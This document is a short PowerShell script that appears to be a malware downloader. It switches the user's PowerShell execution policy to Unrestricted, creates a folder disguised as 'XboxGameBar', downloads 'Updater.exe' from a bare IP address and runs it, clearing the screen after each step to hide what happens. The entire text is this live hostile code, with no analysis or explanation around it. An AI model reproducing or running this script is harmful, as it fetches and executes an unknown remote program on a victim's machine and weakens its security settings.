New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force
Clear-Host
$Path = $env:ProgramData + "\XboxGameBar"
New-Item -Path $Path -ItemType Directory
Clear-Host
$ProcName = "Updater.exe"
Clear-Host
$WebFile = "http://62.182.84.61/4563636/$ProcName" 
Clear-Host
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$Path\$ProcName")
Clear-Host
Start-Process ("$Path\$ProcName")
Clear-Host